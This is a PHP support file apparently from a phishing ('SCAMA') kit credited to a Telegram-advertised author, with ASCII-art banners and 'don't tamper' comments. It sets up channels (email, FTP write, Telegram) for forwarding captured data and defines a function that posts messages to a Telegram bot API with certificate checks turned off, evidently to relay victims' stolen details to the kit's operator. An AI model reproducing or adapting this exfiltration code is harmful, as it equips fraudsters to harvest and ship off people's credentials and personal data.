<?php
@include "../settings.php";
@include "../../settings.php";
################# SCAMA : MADE By Yochi ########################
################ # # # # # # # # # # # # # #  ##################
################ Any problems contact me  : ####################
################    Yochi Grr  #################################
################################################################
############## # # # # # # # # # # # # # #  # # # # # # ########
##################       Good Luck       #######################
############## # # # # # # # # # # # # # # # # # ###############
################# SCAMA : MADE By Yochi ########################
/*  ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   | ||_|           grrrr
	Telegram : @yo_chi
									   */

################## Don't touch below code Unless You Know what you are doing!
//   <============================= Dont tamper =============================>
//    ########################### Very Fragile Code ##########################
//   <============================= Dont tamper =============================>

$Send_Email = $sendtoemail;
$Ftp_Write = $ftpsave;
$send_tg= $sendtotg;
//   <============================= Your Email =============================>
$to      = $send;
//   <============================= Your Email =============================>

$tgtoken = $tgbot;
$tgid = $chatid;

function sendtoTG($chatID, $messaggio, $token) {
	$data = [
		'text' => $messaggio,'chat_id' => $chatID
			];

$website="https://api.telegram.org/bot$token";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
};

//   <================================ End =================================>
//    ######################### End Of Fragile Code #########################
//   <================================ End =================================>

/*  ___      ___      _______  __
	\  \    /  /     /  _____||  |
	 \  \  /  /	    /  /	  |  |
	  \  \/  /	   |  |		  |  |___    O
	   \    /____  |  |       |   ___ \	 _
		|  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
		|__|\____/   \______| |__|   | ||_|           grrrr
	Telegram : @yo_chi
									   */


?>